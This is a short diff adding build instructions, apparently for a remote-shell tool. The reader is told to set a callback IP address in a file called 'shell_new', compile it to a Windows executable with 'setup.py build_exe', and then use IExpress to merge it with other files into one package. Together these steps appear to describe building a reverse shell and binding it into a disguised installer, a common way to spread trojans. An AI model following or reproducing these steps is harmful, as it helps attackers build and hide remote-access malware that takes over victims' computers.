@@ -1,0 +1,6 @@
+change your ip in shell_new. The Now's ip is 177.32.67.80
+then you go to cmd in this very page and type:
+setup.py build_exe
+Then go on and search the exe file.
+Open IExpress 2.0 In your Windows
+And join all the files together
